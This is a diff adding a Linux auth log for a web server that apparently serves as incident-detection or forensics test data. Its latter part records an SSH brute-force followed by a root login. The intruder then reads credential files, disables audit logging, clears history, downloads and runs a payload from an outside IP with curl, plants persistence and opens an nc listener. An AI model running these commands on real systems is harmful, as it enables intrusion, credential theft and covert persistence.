@@ -1,0 +1,119 @@
+Apr 12 08:00:01 webserver-prod-01 CRON[21001]: pam_unix(cron:session): session opened for user root by (uid=0)
+Apr 12 08:00:02 webserver-prod-01 CRON[21001]: pam_unix(cron:session): session closed for user root
+Apr 12 08:15:42 webserver-prod-01 sshd[21100]: Accepted publickey for deploy from 10.0.1.50 port 45678 ssh2: RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ
+Apr 12 08:15:42 webserver-prod-01 sshd[21100]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Apr 12 08:15:45 webserver-prod-01 sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Apr 12 08:15:47 webserver-prod-01 sudo: pam_unix(sudo:session): session opened for user root by deploy(uid=1001)
+Apr 12 08:15:48 webserver-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Apr 12 08:16:02 webserver-prod-01 sshd[21100]: pam_unix(sshd:session): session closed for user deploy
+Apr 12 09:02:11 webserver-prod-01 sshd[21250]: Accepted publickey for alice from 10.0.2.15 port 51234 ssh2: ED25519 SHA256:xYzAbCdEfGhIjKlMnOpQrSt
+Apr 12 09:02:11 webserver-prod-01 sshd[21250]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+Apr 12 09:02:30 webserver-prod-01 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 200 /var/log/nginx/error.log
+Apr 12 09:02:30 webserver-prod-01 sudo: pam_unix(sudo:session): session opened for user root by alice(uid=1002)
+Apr 12 09:02:32 webserver-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Apr 12 09:05:18 webserver-prod-01 sshd[21250]: pam_unix(sshd:session): session closed for user alice
+Apr 12 11:30:02 webserver-prod-01 sshd[21400]: Accepted publickey for bob from 10.0.2.22 port 55677 ssh2: ED25519 SHA256:pQrStUvWxYzAbCdEfGhIjKl
+Apr 12 11:30:03 webserver-prod-01 sshd[21400]: pam_unix(sshd:session): session opened for user bob(uid=1003) by (uid=0)
+Apr 12 11:30:45 webserver-prod-01 sudo:     bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update
+Apr 12 11:31:02 webserver-prod-01 sudo:     bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt upgrade -y
+Apr 12 11:34:21 webserver-prod-01 sshd[21400]: pam_unix(sshd:session): session closed for user bob
+Apr 12 12:00:01 webserver-prod-01 CRON[21501]: pam_unix(cron:session): session opened for user root by (uid=0)
+Apr 12 12:00:02 webserver-prod-01 CRON[21501]: pam_unix(cron:session): session closed for user root
+Apr 12 13:15:33 webserver-prod-01 sshd[21650]: Accepted publickey for deploy from 10.0.1.50 port 46012 ssh2: RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ
+Apr 12 13:15:33 webserver-prod-01 sshd[21650]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Apr 12 13:15:35 webserver-prod-01 sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Apr 12 13:15:40 webserver-prod-01 sshd[21650]: pam_unix(sshd:session): session closed for user deploy
+Apr 12 14:30:04 webserver-prod-01 sshd[22001]: Invalid user admin from 45.123.45.67 port 51112
+Apr 12 14:30:04 webserver-prod-01 sshd[22001]: Failed password for invalid user admin from 45.123.45.67 port 51112 ssh2
+Apr 12 14:30:07 webserver-prod-01 sshd[22002]: Invalid user administrator from 45.123.45.67 port 51114
+Apr 12 14:30:07 webserver-prod-01 sshd[22002]: Failed password for invalid user administrator from 45.123.45.67 port 51114 ssh2
+Apr 12 14:30:10 webserver-prod-01 sshd[22003]: Invalid user test from 45.123.45.67 port 51116
+Apr 12 14:30:10 webserver-prod-01 sshd[22003]: Failed password for invalid user test from 45.123.45.67 port 51116 ssh2
+Apr 12 14:30:13 webserver-prod-01 sshd[22004]: Invalid user guest from 45.123.45.67 port 51118
+Apr 12 14:30:13 webserver-prod-01 sshd[22004]: Failed password for invalid user guest from 45.123.45.67 port 51118 ssh2
+Apr 12 14:30:16 webserver-prod-01 sshd[22005]: Invalid user oracle from 45.123.45.67 port 51120
+Apr 12 14:30:16 webserver-prod-01 sshd[22005]: Failed password for invalid user oracle from 45.123.45.67 port 51120 ssh2
+Apr 12 14:30:19 webserver-prod-01 sshd[22006]: Invalid user postgres from 45.123.45.67 port 51122
+Apr 12 14:30:19 webserver-prod-01 sshd[22006]: Failed password for invalid user postgres from 45.123.45.67 port 51122 ssh2
+Apr 12 14:30:22 webserver-prod-01 sshd[22007]: Invalid user mysql from 45.123.45.67 port 51124
+Apr 12 14:30:22 webserver-prod-01 sshd[22007]: Failed password for invalid user mysql from 45.123.45.67 port 51124 ssh2
+Apr 12 14:30:25 webserver-prod-01 sshd[22008]: Invalid user ftp from 45.123.45.67 port 51126
+Apr 12 14:30:25 webserver-prod-01 sshd[22008]: Failed password for invalid user ftp from 45.123.45.67 port 51126 ssh2
+Apr 12 14:30:28 webserver-prod-01 sshd[22009]: Invalid user ubuntu from 45.123.45.67 port 51128
+Apr 12 14:30:28 webserver-prod-01 sshd[22009]: Failed password for invalid user ubuntu from 45.123.45.67 port 51128 ssh2
+Apr 12 14:30:31 webserver-prod-01 sshd[22010]: Invalid user centos from 45.123.45.67 port 51130
+Apr 12 14:30:31 webserver-prod-01 sshd[22010]: Failed password for invalid user centos from 45.123.45.67 port 51130 ssh2
+Apr 12 14:30:34 webserver-prod-01 sshd[22011]: Failed password for root from 45.123.45.67 port 51132 ssh2
+Apr 12 14:30:37 webserver-prod-01 sshd[22012]: Failed password for root from 45.123.45.67 port 51134 ssh2
+Apr 12 14:30:40 webserver-prod-01 sshd[22013]: Failed password for root from 45.123.45.67 port 51136 ssh2
+Apr 12 14:30:43 webserver-prod-01 sshd[22014]: Failed password for root from 45.123.45.67 port 51138 ssh2
+Apr 12 14:30:46 webserver-prod-01 sshd[22015]: Failed password for root from 45.123.45.67 port 51140 ssh2
+Apr 12 14:30:49 webserver-prod-01 sshd[22016]: Failed password for root from 45.123.45.67 port 51142 ssh2
+Apr 12 14:30:52 webserver-prod-01 sshd[22017]: Failed password for root from 45.123.45.67 port 51144 ssh2
+Apr 12 14:30:55 webserver-prod-01 sshd[22018]: Failed password for root from 45.123.45.67 port 51146 ssh2
+Apr 12 14:30:58 webserver-prod-01 sshd[22019]: Failed password for root from 45.123.45.67 port 51148 ssh2
+Apr 12 14:31:01 webserver-prod-01 sshd[22020]: Failed password for root from 45.123.45.67 port 51150 ssh2
+Apr 12 14:31:04 webserver-prod-01 sshd[22021]: Failed password for root from 45.123.45.67 port 51152 ssh2
+Apr 12 14:31:07 webserver-prod-01 sshd[22022]: Failed password for root from 45.123.45.67 port 51154 ssh2
+Apr 12 14:31:10 webserver-prod-01 sshd[22023]: Failed password for root from 45.123.45.67 port 51156 ssh2
+Apr 12 14:31:13 webserver-prod-01 sshd[22024]: Failed password for root from 45.123.45.67 port 51158 ssh2
+Apr 12 14:31:16 webserver-prod-01 sshd[22025]: Failed password for root from 45.123.45.67 port 51160 ssh2
+Apr 12 14:31:19 webserver-prod-01 sshd[22026]: Failed password for root from 45.123.45.67 port 51162 ssh2
+Apr 12 14:31:22 webserver-prod-01 sshd[22027]: Failed password for root from 45.123.45.67 port 51164 ssh2
+Apr 12 14:31:25 webserver-prod-01 sshd[22028]: Failed password for root from 45.123.45.67 port 51166 ssh2
+Apr 12 14:31:28 webserver-prod-01 sshd[22029]: Failed password for root from 45.123.45.67 port 51168 ssh2
+Apr 12 14:31:31 webserver-prod-01 sshd[22030]: Failed password for root from 45.123.45.67 port 51170 ssh2
+Apr 12 14:31:34 webserver-prod-01 sshd[22031]: Failed password for root from 45.123.45.67 port 51172 ssh2
+Apr 12 14:31:37 webserver-prod-01 sshd[22032]: Failed password for root from 45.123.45.67 port 51174 ssh2
+Apr 12 14:31:40 webserver-prod-01 sshd[22033]: Failed password for root from 45.123.45.67 port 51176 ssh2
+Apr 12 14:31:43 webserver-prod-01 sshd[22034]: Failed password for root from 45.123.45.67 port 51178 ssh2
+Apr 12 14:31:46 webserver-prod-01 sshd[22035]: Failed password for root from 45.123.45.67 port 51180 ssh2
+Apr 12 14:31:49 webserver-prod-01 sshd[22036]: Failed password for root from 45.123.45.67 port 51182 ssh2
+Apr 12 14:31:52 webserver-prod-01 sshd[22037]: Failed password for root from 45.123.45.67 port 51184 ssh2
+Apr 12 14:31:55 webserver-prod-01 sshd[22038]: Failed password for root from 45.123.45.67 port 51186 ssh2
+Apr 12 14:31:58 webserver-prod-01 sshd[22039]: Failed password for root from 45.123.45.67 port 51188 ssh2
+Apr 12 14:32:01 webserver-prod-01 sshd[22040]: Failed password for root from 45.123.45.67 port 51190 ssh2
+Apr 12 14:32:04 webserver-prod-01 sshd[22041]: Failed password for root from 45.123.45.67 port 51192 ssh2
+Apr 12 14:32:07 webserver-prod-01 sshd[22042]: Failed password for root from 45.123.45.67 port 51194 ssh2
+Apr 12 14:32:10 webserver-prod-01 sshd[22043]: Failed password for root from 45.123.45.67 port 51196 ssh2
+Apr 12 14:32:13 webserver-prod-01 sshd[22044]: Failed password for root from 45.123.45.67 port 51198 ssh2
+Apr 12 14:32:16 webserver-prod-01 sshd[22045]: Failed password for root from 45.123.45.67 port 51200 ssh2
+Apr 12 14:32:19 webserver-prod-01 sshd[22046]: Failed password for root from 45.123.45.67 port 51202 ssh2
+Apr 12 14:32:22 webserver-prod-01 sshd[22047]: Failed password for root from 45.123.45.67 port 51204 ssh2
+Apr 12 14:32:25 webserver-prod-01 sshd[22048]: Failed password for root from 45.123.45.67 port 51206 ssh2
+Apr 12 14:32:28 webserver-prod-01 sshd[22049]: Failed password for root from 45.123.45.67 port 51208 ssh2
+Apr 12 14:32:31 webserver-prod-01 sshd[22050]: Failed password for root from 45.123.45.67 port 51210 ssh2
+Apr 12 14:32:34 webserver-prod-01 sshd[22051]: Failed password for root from 45.123.45.67 port 51212 ssh2
+Apr 12 14:32:37 webserver-prod-01 sshd[22052]: Failed password for root from 45.123.45.67 port 51214 ssh2
+Apr 12 14:32:40 webserver-prod-01 sshd[22053]: Failed password for root from 45.123.45.67 port 51216 ssh2
+Apr 12 14:32:43 webserver-prod-01 sshd[22054]: Failed password for root from 45.123.45.67 port 51218 ssh2
+Apr 12 14:32:46 webserver-prod-01 sshd[22055]: Failed password for root from 45.123.45.67 port 51220 ssh2
+Apr 12 14:32:49 webserver-prod-01 sshd[22056]: Failed password for root from 45.123.45.67 port 51222 ssh2
+Apr 12 14:32:52 webserver-prod-01 sshd[22057]: Failed password for root from 45.123.45.67 port 51224 ssh2
+Apr 12 14:32:55 webserver-prod-01 sshd[22058]: Failed password for root from 45.123.45.67 port 51226 ssh2
+Apr 12 14:32:58 webserver-prod-01 sshd[22059]: Failed password for root from 45.123.45.67 port 51228 ssh2
+Apr 12 14:33:01 webserver-prod-01 sshd[22060]: Failed password for root from 45.123.45.67 port 51230 ssh2
+Apr 12 14:45:12 webserver-prod-01 sshd[22201]: Accepted password for root from 45.123.45.67 port 58800 ssh2
+Apr 12 14:45:12 webserver-prod-01 sshd[22201]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
+Apr 12 14:45:33 webserver-prod-01 sudo:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Apr 12 14:45:33 webserver-prod-01 sudo: pam_unix(sudo:session): session opened for user root by root(uid=0)
+Apr 12 14:45:34 webserver-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Apr 12 14:45:40 webserver-prod-01 sudo:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/passwd
+Apr 12 14:45:45 webserver-prod-01 sudo:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/sudoers
+Apr 12 14:46:02 webserver-prod-01 useradd[22215]: new user: name=sysd, UID=1050, GID=1050, home=/home/sysd, shell=/bin/bash
+Apr 12 14:46:02 webserver-prod-01 groupadd[22215]: new group: name=sysd, GID=1050
+Apr 12 14:46:15 webserver-prod-01 sudo:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl stop auditd
+Apr 12 14:46:22 webserver-prod-01 sudo:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl disable auditd
+Apr 12 14:46:30 webserver-prod-01 sudo:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl stop rsyslog
+Apr 12 14:46:40 webserver-prod-01 sudo:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c history -c
+Apr 12 14:46:48 webserver-prod-01 sudo:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c > /root/.bash_history
+Apr 12 14:47:05 webserver-prod-01 sudo:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl https://185.177.124.22/payload.sh -o /tmp/.x
+Apr 12 14:47:12 webserver-prod-01 sudo:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/bash /tmp/.x
+Apr 12 14:47:30 webserver-prod-01 sudo:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/chattr +i /tmp/.x
+Apr 12 14:47:45 webserver-prod-01 sudo:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/cp /tmp/.x /etc/systemd/system/sysd-helper.service
+Apr 12 14:47:52 webserver-prod-01 sudo:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl enable sysd-helper
+Apr 12 14:48:01 webserver-prod-01 sudo:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/crontab -e
+Apr 12 14:48:30 webserver-prod-01 sudo:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c echo 'ssh-rsa AAAAB3NzaC1yc2EAAAA...' >> /root/.ssh/authorized_keys
+Apr 12 14:49:00 webserver-prod-01 sudo:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/sbin/iptables -F
+Apr 12 14:49:10 webserver-prod-01 sudo:    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/nc -lvnp 4444
+Apr 12 15:00:02 webserver-prod-01 sshd[22201]: pam_unix(sshd:session): session closed for user root
